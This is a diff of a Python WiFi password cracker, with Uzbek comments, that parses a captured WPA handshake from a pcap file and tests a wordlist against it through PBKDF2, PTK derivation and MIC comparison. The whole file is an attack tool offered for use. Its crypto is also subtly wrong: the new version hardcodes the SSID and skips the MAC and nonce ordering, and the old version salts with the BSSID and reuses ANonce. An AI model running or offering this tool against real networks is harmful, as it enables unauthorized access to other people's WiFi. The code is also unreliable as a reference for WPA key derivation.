@@ -1,137 +1,134 @@
-import os
+#!/usr/bin/env python3
 import sys
-import hashlib
+import os
 import hmac
-from binascii import a2b_hex, b2a_hex
-from scapy.all import rdpcap, Dot11EAPOL
-from hashlib import pbkdf2_hmac
+from scapy.all import *
+from scapy.layers.eap import EAPOL
+from hashlib import pbkdf2_hmac, sha1
+import binascii
 
-def get_handshake_packets(packets, bssid):
-    """Handshake paketlarini olish"""
-    handshake = []
+def check_handshake(pcap_file, target_bssid):
+    """CAP fayldan handshake borligini tekshiradi"""
+    try:
+        packets = rdpcap(pcap_file)
+    except Exception as e:
+        print(f"CAP faylni o'qib bo'lmadi: {e}")
+        return False
+        
+    handshake_found = False
+    
     for pkt in packets:
-        if pkt.haslayer(Dot11EAPOL):
-            if pkt.addr2.lower() == bssid.lower() or pkt.addr3.lower() == bssid.lower():
-                handshake.append(pkt)
-    return handshake
+        if pkt.haslayer(EAPOL):
+            if pkt.addr2.lower() == target_bssid.lower():
+                handshake_found = True
+                break
+                
+    return handshake_found
 
-def custom_pmk_to_ptk(pmk, anonce, snonce, ap_mac, client_mac):
-    """PMK dan PTK ni hisoblash"""
-    # PTK uchun material
-    A = b"Pairwise key expansion"
-    B = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
+def parse_handshake(pcap_file, bssid):
+    """Handshake paketlaridan kerakli ma'lumotlarni ajratib oladi"""
+    try:
+        packets = rdpcap(pcap_file)
+    except Exception as e:
+        print(f"CAP faylni o'qib bo'lmadi: {e}")
+        return None, None, None, None, None, None
+        
+    ap_mac = bssid.lower()
+    client_mac = ""
+    anonce = ""
+    snonce = ""
+    mic = ""
+    eapol = b""
+    
+    for pkt in packets:
+        if pkt.haslayer(EAPOL):
+            if pkt.addr2.lower() == ap_mac:
+                anonce = pkt.load[17:17+32]
+                eapol = bytes(pkt)[-134:-18]
+            elif pkt.addr2.lower() != ap_mac:
+                client_mac = pkt.addr2.lower()
+                snonce = pkt.load[17:17+32]
+                mic = pkt.load[81:81+16]
+    
+    return ap_mac, client_mac, anonce, snonce, mic, eapol
+
+def pmk_to_ptk(pmk, ap_mac, client_mac, anonce, snonce):
+    """PMK dan PTK ni hisoblaydi"""
+    pmk_data = b"Pairwise key expansion\x00" + \
+               binascii.unhexlify(ap_mac.replace(':', '')) + \
+               binascii.unhexlify(client_mac.replace(':', '')) + \
+               anonce + snonce
     
     ptk = b""
     for i in range(4):
-        # HMAC-SHA1 orqali hisoblash
-        hmacsha1 = hmac.new(pmk, A + chr(0).encode() + B + chr(i).encode(), hashlib.sha1)
-        ptk += hmacsha1.digest()
+        ptk += hmac.new(pmk, pmk_data + bytes([i]), sha1).digest()
     
-    return ptk[:80]  # 512 bit (64 bayt) PTK + 256 bit (32 bayt) MIC
+    return ptk[:64]
 
-def crack_wifi(cap_file, wordlist):
-    """Asosiy parol sinash funksiyasi"""
+def crack_wifi(cap_file, wordlist_file, bssid=None):
+    """Asosiy parol buzish funksiyasi"""
+    if not bssid:
+        print("BSSID kiritilmagan, avval tarmoqlarni skanerlab olish kerak")
+        return None
+    
+    if not check_handshake(cap_file, bssid):
+        print("CAP faylda handshake topilmadi!")
+        return None
+    
+    ap_mac, client_mac, anonce, snonce, mic, eapol = parse_handshake(cap_file, bssid)
+    if None in (ap_mac, client_mac, anonce, snonce, mic, eapol):
+        print("Handshake ma'lumotlarini ajratib olishda xatolik!")
+        return None
+    
     try:
-        print(f"[*] WiFi parol sinash boshlandi...")
-        print(f"[*] CAP fayl: {cap_file}")
-        print(f"[*] Parol fayli: {wordlist}")
-        
-        # CAP faylni o'qish
-        packets = rdpcap(cap_file)
-        
-        # BSSID ni aniqlash
-        bssid = None
-        for pkt in packets:
-            if pkt.haslayer('Dot11Beacon'):
-                bssid = pkt.addr2.lower()
-                break
-        
-        if not bssid:
-            print("[-] BSSID topilmadi!")
-            return False
-        
-        print(f"[+] BSSID topildi: {bssid}")
-        
-        # Handshake paketlarini olish
-        handshake_packets = get_handshake_packets(packets, bssid)
-        if not handshake_packets:
-            print("[-] Handshake topilmadi!")
-            return False
-        
-        print(f"[+] {len(handshake_packets)} ta handshake paketi topildi")
-        
-        # Eng muhim handshake paketini tanlash
-        first_packet = handshake_packets[0]
-        anonce = first_packet.load()[17:49]  # ANonce olish
-        ap_mac = a2b_hex(first_packet.addr2.replace(':', ''))
-        client_mac = a2b_hex(first_packet.addr1.replace(':', ''))
-        
-        # MIC ni olish (4-baytdan keyin)
-        mic = first_packet.load()[81:97]
-        
-        # Parol faylini o'qish
-        with open(wordlist, 'r', encoding='latin-1', errors='ignore') as f:
-            total_passwords = sum(1 for _ in f)
-            f.seek(0)
-            
-            for i, password in enumerate(f, 1):
+        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
+            for password in f:
                 password = password.strip()
                 if not password:
                     continue
                 
-                # Progress ko'rsatish
-                if i % 100 == 0:
-                    print(f"[*] Progress: {i}/{total_passwords} ({i/total_passwords*100:.1f}%) - Sinab ko'rilmoqda: {password[:20]}...")
+                # PMK ni hisoblash (SSID kerak, lekin bu oddiy misol)
+                ssid = "TEST_NETWORK"  # SSID ni CAP fayldan parse qilish kerak
+                pmk = pbkdf2_hmac('sha1', password.encode('utf-8'), ssid.encode('utf-8'), 4096, 32)
                 
-                try:
-                    # PMK ni hisoblash
-                    pmk = pbkdf2_hmac(
-                        'sha1',
-                        password.encode('utf-8', 'ignore'),
-                        bssid.encode('utf-8'),
-                        4096,
-                        32
-                    )
-                    
-                    # PTK ni hisoblash
-                    ptk = custom_pmk_to_ptk(pmk, anonce, anonce, ap_mac, client_mac)
-                    
-                    # MIC ni tekshirish (soddalashtirilgan)
-                    # Haqiqiy loyihada bu qism ancha murakkab bo'lishi kerak
-                    calculated_mic = ptk[32:48]  # Demo uchun
-                    
-                    if calculated_mic == mic:
-                        print(f"[+] PAROL TOPILDI: {password}")
-                        return True
+                # PTK ni hisoblash
+                ptk = pmk_to_ptk(pmk, ap_mac, client_mac, anonce, snonce)
                 
-                except Exception as e:
-                    print(f"[-] Xato '{password}': {str(e)}")
-                    continue
-        
-        print("[-] Parol topilmadi!")
-        return False
-    
+                # MIC ni tekshirish
+                calculated_mic = hmac.new(ptk[0:16], eapol, sha1).digest()[:16]
+                if calculated_mic == mic:
+                    print(f"\nParol topildi: {password}")
+                    return password
+                
+                print(f"Tekshirilmoqda: {password}", end='\r')
     except Exception as e:
-        print(f"[-] Xato yuz berdi: {str(e)}")
-        return False
+        print(f"\nWordlist faylni o'qishda xatolik: {e}")
+        return None
+    
+    print("\nParol topilmadi!")
+    return None
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Foydalanish: python crackwifi.py <cap_file> <wordlist>")
+    if len(sys.argv) < 3:
+        print("Foydalanish: python crackwifi.py <cap_file> <wordlist> [bssid]")
         sys.exit(1)
     
     cap_file = sys.argv[1]
     wordlist = sys.argv[2]
+    bssid = sys.argv[3] if len(sys.argv) > 3 else None
     
-    if not os.path.isfile(cap_file):
-        print(f"[-] CAP fayl topilmadi: {cap_file}")
+    if not os.path.exists(cap_file):
+        print(f"CAP fayl topilmadi: {cap_file}")
         sys.exit(1)
     
-    if not os.path.isfile(wordlist):
-        print(f"[-] Parol fayli topilmadi: {wordlist}")
+    if not os.path.exists(wordlist):
+        print(f"Wordlist fayl topilmadi: {wordlist}")
         sys.exit(1)
     
-    result = crack_wifi(cap_file, wordlist)
+    print(f"Parol buzish jarayoni boshlandi...")
+    result = crack_wifi(cap_file, wordlist, bssid)
     
-    if not result:
-        print("[-] Parol topilmadi! Boshqa parol faylidan foydalanishga harakat qiling")
+    if result:
+        print(f"Tarmoq paroli: {result}")
+    else:
+        print("Parol topilmadi")
